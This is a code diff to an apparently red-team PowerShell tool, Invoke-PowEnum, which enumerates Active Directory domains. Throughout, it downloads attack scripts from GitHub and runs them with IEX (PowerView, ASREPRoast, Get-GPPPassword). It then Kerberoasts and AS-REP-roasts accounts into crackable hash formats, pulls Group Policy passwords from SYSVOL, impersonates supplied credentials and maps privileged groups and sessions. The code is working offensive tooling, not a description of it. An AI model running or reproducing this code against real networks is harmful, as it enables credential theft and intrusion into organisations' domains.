@@ -29,7 +29,7 @@ function Invoke-PowEnum
 	
 		Basic: Basic Enumeration:
 				UsersAndGroups Speadsheet
-					Domain Admins, Enterprise Admins, Built-In Admins, DC Local Admins, All Domain Users, All Domain Groups
+					Domain Admins, Enterprise Admins, Built-In Admins, DC Local Admins, misc privileged groups, All Domain Users, All Domain Groups,
 				HostsAndSessions Spreadsheet
 					All [DC Aware] Net Sessions, Domain Controller, Domain Computer IPs, Domain Computers, Subnets, DNSRecords, WinRM Enabled Hosts
 		Roasting: Kerberoast and ASREPRoast
@@ -42,6 +42,10 @@ function Invoke-PowEnum
 			Enabled, Smartcard Required
 			Enabled, Smartcard Required, Password Not Required
 			Enabled, Smartcard Required, Password Doesn't Expire
+		SYSVOL: Searches SYSVOL on DC
+			Group Policy Passwords
+			Potential SYSVOL Logon Scripts
+			
 		
 	.EXAMPLE 
 		
@@ -87,18 +91,21 @@ Param(
 
 	[Parameter(Position = 2)]
     [String]
-    $URL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1",
+    $PowerViewURL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1",
+	
+	[Parameter(Position = 2)]
+    [String]
+    $ASREPRoastURL = "https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1",
+	
+	[Parameter(Position = 2)]
+    [String]
+    $GetGPPPasswordURL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-GPPPassword.ps1",
 	
 	[Parameter(ParameterSetName = 'Credential')]
     [Management.Automation.PSCredential]
     [Management.Automation.CredentialAttribute()]
     $Credential
 )
-	
-$Domain = $FQDN
-
-Write-Host "To run from a non-domain joined system:" -ForegroundColor Cyan
-Write-Host "runas /netonly /user:DOMAIN\USERNAME powershell.exe"
 
 #Start Stopwatch
 $stopwatch = [system.diagnostics.stopwatch]::startnew()
@@ -113,8 +120,8 @@ try {
         $webclient = New-Object System.Net.WebClient
         $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
         Write-Host "Downloading Powerview:" -ForegroundColor Cyan
-        Write-Host "$URL | " -NoNewLine
-        IEX $webclient.DownloadString($URL)
+        Write-Host "$PowerViewURL | " -NoNewLine
+        IEX $webclient.DownloadString($PowerViewURL)
         Write-Host "Success" -ForegroundColor Green
     }
 }catch {Write-Host "Error" -ForegroundColor Red; Return}
@@ -124,7 +131,7 @@ if ($Credential -ne $null){
 	try{
 		$NetworkCredential = $Credential.GetNetworkCredential()
         $UserName = $NetworkCredential.UserName
-	Write-Host "Impersonate user:$Domain\$Username | " -NoNewLine
+	Write-Host "Impersonate user: $FQDN\$Username | " -NoNewLine
 	Invoke-UserImpersonation -Credential $Credential -WarningAction silentlyContinue | Out-Null
 	Write-Host "Success" -ForegroundColor Green 
 	}catch{Write-Host "Error" -ForegroundColor Red; Return}
@@ -132,13 +139,13 @@ if ($Credential -ne $null){
 }	
 	
 #Grab Local Domain
-if (!$domain) {$domain = (Get-Domain).Name}
-if (!$domain) {Write-Host "Unable to retrieve domain, exiting..." -ForegroundColor Red; Return}
-else {Write-Host "Enumeration Domain: $domain" -ForegroundColor Cyan}
+if (!$FQDN) {$FQDN = (Get-Domain).Name}
+if (!$FQDN) {Write-Host "Unable to retrieve domain, exiting..." -ForegroundColor Red; Return}
+else {Write-Host "Enumeration Domain: $FQDN" -ForegroundColor Cyan}
 
 #Supprese Errors and Warnings
-#$ErrorActionPreference = 'Continue'
-#$WarningPreference = "SilentlyContinue"
+$ErrorActionPreference = 'Continue'
+$WarningPreference = "SilentlyContinue"
 
 #Set up spreadsheet arrary and count
 $script:ExportSheetCount = 1
@@ -179,10 +186,9 @@ elseif ($Mode -eq 'Roasting') {
 	PowEnum-Kerberoast
     $webclient = New-Object System.Net.WebClient
     $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
-    $URL = "https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1"
     Write-Host "Downloading ASREPRoast:" -ForegroundColor Cyan
-    Write-Host "$URL"
-    IEX $webclient.DownloadString($URL)
+    Write-Host "$ASREPRoastURL"
+    IEX $webclient.DownloadString($ASREPRoastURL)
 	PowEnum-ASREPRoast
 	PowEnum-ExcelFile -SpreadsheetName Roasting
 }
@@ -194,6 +200,13 @@ elseif ($Mode -eq 'LargeEnv') {
 	PowEnum-EAs
 	PowEnum-BltAdmins
     PowEnum-DCLocalAdmins
+	PowEnum-SchemaAdmins
+	PowEnum-AccountOperators
+	PowEnum-BackupOperators
+	PowEnum-PrintOperators
+	PowEnum-ServerOperators
+	PowEnum-GPCreatorsOwners
+	PowEnum-CryptographicOperators
 	PowEnum-ExcelFile -SpreadsheetName Large-Users
 	
 	$script:ExportSheetCount = 1
@@ -221,11 +234,9 @@ elseif ($Mode -eq 'SYSVOL') {
 	
 	$webclient = New-Object System.Net.WebClient
     $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
-    $URL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-GPPPassword.ps1"
     Write-Host "Downloading Get-GPPPassword:" -ForegroundColor Cyan
-    Write-Host "$URL"
-    IEX $webclient.DownloadString($URL)
-	
+    Write-Host "$GetGPPPasswordURL"
+    IEX $webclient.DownloadString($GetGPPPasswordURL)
 	PowEnum-GPPPassword
 	PowEnum-SYSVOLFiles
 	PowEnum-ExcelFile -SpreadsheetName SYSVOL
@@ -235,10 +246,22 @@ else {
 	Return
 }
 
+#reverting Token
+if ($Credential -ne $null){
+	try{
+		$NetworkCredential = $Credential.GetNetworkCredential()
+        $UserName = $NetworkCredential.UserName
+	Write-Host "Reverting Token from: $FQDN\$Username | " -NoNewLine
+	Invoke-RevertToSelf | Out-Null
+	Write-Host "Success" -ForegroundColor Green 
+	}catch{Write-Host "Error" -ForegroundColor Red; Return}
+}	
+
 Remove-Module Powerview
 
 $stopwatch.Stop()
-Write-Host "Running Time: $($stopwatch.Elapsed.TotalSeconds) seconds"
+$elapsedtime = "{0:N0}" -f ($stopwatch.Elapsed.TotalSeconds)
+Write-Host "Running Time: $elapsedtime seconds"
 Write-Host "Current Date/Time: $(Get-Date)"
 Write-Host "Exiting..." -ForegroundColor Yellow
 }
@@ -246,7 +269,7 @@ Write-Host "Exiting..." -ForegroundColor Yellow
 function PowEnum-DCs {
 	try {
 		Write-Host "[ ]Domain Controllers | " -NoNewLine
-		$temp = Get-DomainController -Domain $domain | Select-Object Name, IPAddress, Domain, Forest, OSVersion, SiteName
+		$temp = Get-DomainController -Domain $FQDN | Select-Object Name, IPAddress, Domain, Forest, OSVersion, SiteName
 		PowEnum-ExportAndCount -TypeEnum DCs
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -254,7 +277,7 @@ function PowEnum-DCs {
 function PowEnum-DAs {
 	try {
 		Write-Host "[ ]Domain Admins | " -NoNewLine
-		$temp = Get-DomainGroupMember -Identity "Domain Admins" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		$temp = Get-DomainGroupMember -Identity "Domain Admins" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		PowEnum-ExportAndCount -TypeEnum DAs
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -262,7 +285,7 @@ function PowEnum-DAs {
 function PowEnum-EAs {
 	try {
 		Write-Host "[ ]Enterprise Admins | " -NoNewLine
-		$temp = Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		$temp = Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		PowEnum-ExportAndCount -TypeEnum EAs
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -270,7 +293,7 @@ function PowEnum-EAs {
 function PowEnum-SchemaAdmins {
 	try {
 		Write-Host "[ ]Schema Admins | " -NoNewLine
-		$temp = Get-DomainGroupMember -Identity "Schema Admins" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		$temp = Get-DomainGroupMember -Identity "Schema Admins" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		PowEnum-ExportAndCount -TypeEnum SchemaAdmins
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -278,7 +301,7 @@ function PowEnum-SchemaAdmins {
 function PowEnum-AccountOperators {
 	try {
 		Write-Host "[ ]Account Operators | " -NoNewLine
-		$temp = Get-DomainGroupMember -Identity "Account Operators" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		$temp = Get-DomainGroupMember -Identity "Account Operators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		PowEnum-ExportAndCount -TypeEnum AcctOperators
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -286,7 +309,7 @@ function PowEnum-AccountOperators {
 function PowEnum-BackupOperators {
 	try {
 		Write-Host "[ ]Backup Operators | " -NoNewLine
-		$temp = Get-DomainGroupMember -Identity "Backup Operators" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		$temp = Get-DomainGroupMember -Identity "Backup Operators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		PowEnum-ExportAndCount -TypeEnum BackupOperators
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -294,7 +317,7 @@ function PowEnum-BackupOperators {
 function PowEnum-PrintOperators {
 	try {
 		Write-Host "[ ]Print Operators | " -NoNewLine
-		$temp = Get-DomainGroupMember -Identity "Print Operators" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		$temp = Get-DomainGroupMember -Identity "Print Operators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		PowEnum-ExportAndCount -TypeEnum PrintOperators
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -302,7 +325,7 @@ function PowEnum-PrintOperators {
 function PowEnum-ServerOperators {
 	try {
 		Write-Host "[ ]Server Operators | " -NoNewLine
-		$temp = Get-DomainGroupMember -Identity "Server Operators" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		$temp = Get-DomainGroupMember -Identity "Server Operators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		PowEnum-ExportAndCount -TypeEnum ServerOperators
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -310,7 +333,7 @@ function PowEnum-ServerOperators {
 function PowEnum-GPCreatorsOwners {
 	try {
 		Write-Host "[ ]Group Policy Creators Owners | " -NoNewLine
-		$temp = Get-DomainGroupMember -Identity "Group Policy Creators Owners" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		$temp = Get-DomainGroupMember -Identity "Group Policy Creators Owners" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		PowEnum-ExportAndCount -TypeEnum GPCreatorsOwners
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -318,7 +341,7 @@ function PowEnum-GPCreatorsOwners {
 function PowEnum-CryptographicOperators {
 	try {
 		Write-Host "[ ]Cryptographic Operators | " -NoNewLine
-		$temp = Get-DomainGroupMember -Identity "Cryptographic Operators" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		$temp = Get-DomainGroupMember -Identity "Cryptographic Operators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		PowEnum-ExportAndCount -TypeEnum CryptographicOperators
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -326,31 +349,31 @@ function PowEnum-CryptographicOperators {
 function PowEnum-BltAdmins {
 	try {
 		Write-Host "[ ]Builtin Administrators | " -NoNewLine
-		$temp = Get-DomainGroupMember -Identity "Administrators" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
+		$temp = Get-DomainGroupMember -Identity "Administrators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
 		PowEnum-ExportAndCount -TypeEnum BltAdmins
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-Users {
 	try {
-		Write-Host "[ ]All Domain Users | " -NoNewLine
-		$temp = Get-DomainUser -Domain $domain | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname
+		Write-Host "[ ]All Domain Users (this could take a while) | " -NoNewLine
+		$temp = Get-DomainUser -Domain $FQDN | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname
 		PowEnum-ExportAndCount -TypeEnum Users
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-Groups {
 	try {
-		Write-Host "[ ]All Domain Groups | " -NoNewLine
-		$temp = Get-DomainGroup -Domain $domain | Select-Object samaccountname, admincount, description, iscriticalsystemobject
+		Write-Host "[ ]All Domain Groups (this could take a while) | " -NoNewLine
+		$temp = Get-DomainGroup -Domain $FQDN | Select-Object samaccountname, admincount, description, iscriticalsystemobject
 		PowEnum-ExportAndCount -TypeEnum Groups
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-Computers {
 	try {
-		Write-Host "[ ]All Domain Computers | " -NoNewLine
-		$temp = Get-NetComputer -Domain $domain | Select-Object samaccountname, dnshostname, operatingsystem, operatingsystemversion, operatingsystemservicepack, lastlogon, badpwdcount, iscriticalsystemobject, distinguishedname
+		Write-Host "[ ]All Domain Computers (this could take a while) | " -NoNewLine
+		$temp = Get-NetComputer -Domain $FQDN | Select-Object samaccountname, dnshostname, operatingsystem, operatingsystemversion, operatingsystemservicepack, lastlogon, badpwdcount, iscriticalsystemobject, distinguishedname
 		PowEnum-ExportAndCount -TypeEnum Computers
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -358,7 +381,7 @@ function PowEnum-Computers {
 function PowEnum-IPs {
 	try {
 		Write-Host "[ ]All Domain Computer IP Addresses  | " -NoNewLine
-		$temp = Get-DomainComputer -Domain $domain | Get-IPAddress
+		$temp = Get-DomainComputer -Domain $FQDN | Get-IPAddress
 		PowEnum-ExportAndCount -TypeEnum IPs
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -366,7 +389,7 @@ function PowEnum-IPs {
 function PowEnum-DCLocalAdmins {
 	try {
 		Write-Host "[ ]All Domain Controller Local Admins | " -NoNewLine
-		$temp = Get-DomainController -Domain $domain | Get-NetLocalGroupMember
+		$temp = Get-DomainController -Domain $FQDN | Get-NetLocalGroupMember
 		PowEnum-ExportAndCount -TypeEnum DCLocalAdmins
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -374,7 +397,7 @@ function PowEnum-DCLocalAdmins {
 function PowEnum-Subnets {
 	try {
 		Write-Host "[ ]Domain Subnets | " -NoNewLine
-		$temp = Get-DomainSubnet -Domain $domain
+		$temp = Get-DomainSubnet -Domain $FQDN
 		PowEnum-ExportAndCount -TypeEnum Subnets
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -382,7 +405,7 @@ function PowEnum-Subnets {
 function PowEnum-DNSRecords {
 	try {
 		Write-Host "[ ]DNS Zones & Records | " -NoNewLine
-		$temp = Get-DomainDNSZone -Domain $domain | Get-DomainDNSRecord
+		$temp = Get-DomainDNSZone -Domain $FQDN | Get-DomainDNSRecord
 		PowEnum-ExportAndCount -TypeEnum DNSRecords
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -393,7 +416,7 @@ function PowEnum-HVTs {
 		Write-Host "[ ]High Value Targets | " -NoNewLine
 		
         #Grab all admins of the DCs
-        $LocalAdminsOnDCs = Get-DomainController -Domain $domain | Get-NetLocalGroupMember
+        $LocalAdminsOnDCs = Get-DomainController -Domain $FQDN | Get-NetLocalGroupMember
         
         #Grab all "Domain" accounts and get the members
         $temp = $LocalAdminsOnDCs | Where-Object {$_.IsGroup -eq $TRUE -and $_.IsDomain -eq $TRUE} | ForEach-Object {$_.MemberName.Substring($_.MemberName.IndexOf("\")+1)} | Sort-Object -Unique | Get-DomainGroupMember
@@ -409,7 +432,7 @@ function PowEnum-HVTs {
 function PowEnum-NetSess {
 	try {
 		Write-Host "[ ]Net Sessions | " -NoNewLine
-		$temp = Get-DomainController -Domain $domain | Get-NetSession | ?{$_.UserName -notlike "*$"}
+		$temp = Get-DomainController -Domain $FQDN | Get-NetSession | ?{$_.UserName -notlike "*$"}
 		PowEnum-ExportAndCount -TypeEnum NetSess
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -417,7 +440,7 @@ function PowEnum-NetSess {
 function PowEnum-WinRM {
 	try {
 		Write-Host "[ ]WinRm (Powershell Remoting) Enabled Hosts | " -NoNewLine
-		$temp = Get-DomainComputer -Domain $domain -LDAPFilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -SPN "wsman*" -Properties dnshostname,operatingsystem,distinguishedname
+		$temp = Get-DomainComputer -Domain $FQDN -LDAPFilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -SPN "wsman*" -Properties dnshostname,operatingsystem,distinguishedname
 		PowEnum-ExportAndCount -TypeEnum WinRM
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -425,7 +448,7 @@ function PowEnum-WinRM {
 function PowEnum-Disabled {
 	try{
 		Write-Host "[ ]Disabled Account | " -NoNewLine
-		$temp = Get-DomainUser -Domain $domain | Where-Object {$_.useraccountcontrol -eq '514'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname
+		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '514'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname
 		PowEnum-ExportAndCount -TypeEnum Disabled
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -433,7 +456,7 @@ function PowEnum-Disabled {
 function PowEnum-PwNotReq {
 	try{
 		Write-Host "[ ]Enabled, Password Not Required | " -NoNewLine
-		$temp = Get-DomainUser -Domain $domain | Where-Object {$_.useraccountcontrol -eq '544'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname
+		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '544'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname
 		PowEnum-ExportAndCount -TypeEnum PwNotReq
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -441,7 +464,7 @@ function PowEnum-PwNotReq {
 function PowEnum-PwNotExp {
 	try{
 		Write-Host "[ ]Enabled, Password Doesn't Expire | " -NoNewLine
-		$temp = Get-DomainUser -Domain $domain | Where-Object {$_.useraccountcontrol -eq '66048'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
+		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '66048'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
 		PowEnum-ExportAndCount -TypeEnum PwNotExpire
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -449,7 +472,7 @@ function PowEnum-PwNotExp {
 function PowEnum-PwNotExpireNotReq {
 	try{
 		Write-Host "[ ]Enabled, Password Doesn't Expire & Not Required | " -NoNewLine
-		$temp = Get-DomainUser -Domain $domain | Where-Object {$_.useraccountcontrol -eq '66080'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
+		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '66080'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
 		PowEnum-ExportAndCount -TypeEnum PwNotExpireNotReq
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -457,7 +480,7 @@ function PowEnum-PwNotExpireNotReq {
 function PowEnum-SmartCardReq {
 	try{
 		Write-Host "[ ]Enabled, Smartcard Required | " -NoNewLine
-		$temp = Get-DomainUser -Domain $domain | Where-Object {$_.useraccountcontrol -eq '262656'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
+		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '262656'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
 		PowEnum-ExportAndCount -TypeEnum SmartCardReq
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -465,7 +488,7 @@ function PowEnum-SmartCardReq {
 function PowEnum-SmartCardReqPwNotReq {
 	try{
 		Write-Host "[ ]Enabled, Smartcard Required, Password Not Required | " -NoNewLine
-		$temp = Get-DomainUser -Domain $domain | Where-Object {$_.useraccountcontrol -eq '262688'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
+		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '262688'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
 		PowEnum-ExportAndCount -TypeEnum SmartCardReqPwNotReq
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -473,7 +496,7 @@ function PowEnum-SmartCardReqPwNotReq {
 function PowEnum-SmartCardReqPwNotExp {
 	try{
 		Write-Host "[ ]Enabled, Smartcard Required, Password Doesn't Expire | " -NoNewLine
-		$temp = Get-DomainUser -Domain $domain | Where-Object {$_.useraccountcontrol -eq '328192'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
+		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '328192'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
 		PowEnum-ExportAndCount -TypeEnum SmartCardReqPwNotExp
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -481,7 +504,7 @@ function PowEnum-SmartCardReqPwNotExp {
 function PowEnum-SmartCardReqPwNotExpNotReq {
 	try{
 		Write-Host "[ ]Enabled, Smartcard Required, Password Doesn't Expire & Not Required | " -NoNewLine
-		$temp = Get-DomainUser -Domain $domain | Where-Object {$_.useraccountcontrol -eq '328224'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
+		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '328224'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
 		PowEnum-ExportAndCount -TypeEnum SmartCardReqPwNotExpNotReq
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -489,7 +512,7 @@ function PowEnum-SmartCardReqPwNotExpNotReq {
 function PowEnum-ASREPRoast {
 	try{
 		Write-Host "[ ]ASREProast (John Format) | " -NoNewLine
-		$temp = Invoke-ASREPRoast -Domain $domain
+		$temp = Invoke-ASREPRoast -Domain $FQDN
 		PowEnum-ExportAndCount -TypeEnum ASREPRoast
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -497,7 +520,7 @@ function PowEnum-ASREPRoast {
 function PowEnum-Kerberoast {
 	try{
 		Write-Host "[ ]Kerberoast (Hashcat Format) | " -NoNewLine
-		$temp = Invoke-Kerberoast -OutputFormat Hashcat -Domain $domain -WarningAction silentlyContinue
+		$temp = Invoke-Kerberoast -OutputFormat Hashcat -Domain $FQDN -WarningAction silentlyContinue
 		PowEnum-ExportAndCount -TypeEnum Kerberoast
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -505,17 +528,15 @@ function PowEnum-Kerberoast {
 function PowEnum-GPPPassword {
 	try{
 		Write-Host "[ ]GPP Password(s) | " -NoNewLine
-		$temp = Get-GPPPassword -Server $domain
+		$temp = Get-GPPPassword
 		PowEnum-ExportAndCount -TypeEnum GPPPassword
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
 
 function PowEnum-SYSVOLFiles {
 	try{
-		$pdc = (Get-Domain -Domain $domain).PdcRoleOwner.Name
-		Write-Host "[ ]Potential logon scripts on \\$pdc\SYSVOL | " -NoNewLine
-		$temp = Find-InterestingDomainShareFile -Include @('*.vbs', '*.bat', '*.ps1') -SharePath "\\$pdc\SYSVOL" -ComputerName $pdc
-		Write-Host $temp
+		Write-Host "[ ]Potential logon scripts on \\$FQDN\SYSVOL | " -NoNewLine
+		$temp = Find-InterestingFile -Path \\$FQDN\sysvol -Include @('*.vbs', '*.bat', '*.ps1') -Verbose
 		PowEnum-ExportAndCount -TypeEnum SYSVOLFiles
 	}catch {Write-Host "Error" -ForegroundColor Red}
 }
@@ -529,7 +550,7 @@ function PowEnum-ExportAndCount {
 	if($temp -ne $null){
 		
 		#Grab the file name and the full path
-		$exportfilename = $domain.Substring(0,$domain.IndexOf("."))+ '_' + $ExportSheetCount.toString() + '_' + $TypeEnum + '.csv'
+		$exportfilename = $FQDN.Substring(0,$FQDN.IndexOf("."))+ '_' + $ExportSheetCount.toString() + '_' + $TypeEnum + '.csv'
 		$exportfilepath = (Get-Item -Path ".\" -Verbose).FullName + '\' + $exportfilename
 		
 		#Perform the actual export
@@ -559,7 +580,7 @@ function PowEnum-ExcelFile {
 		#Exit if enumeration resulting in nothing
 		if($script:ExportSheetFileArray.Count -eq 0){Write-Host "No Data Identified" -ForegroundColor Yellow; Return}
 		$path = (Get-Item -Path ".\" -Verbose).FullName
-		$XLOutput =  $path + "\" + $Domain + "_" + $SpreadsheetName.Substring($SpreadsheetName.IndexOf("_")+1) + "_" + $(get-random) + ".xlsx"
+		$XLOutput =  $path + "\" + $FQDN + "_" + $SpreadsheetName.Substring($SpreadsheetName.IndexOf("_")+1) + "_" + $(get-random) + ".xlsx"
 
 		# Create Excel object (visible), workbook and worksheet
 		$Excel = New-Object -ComObject excel.application 
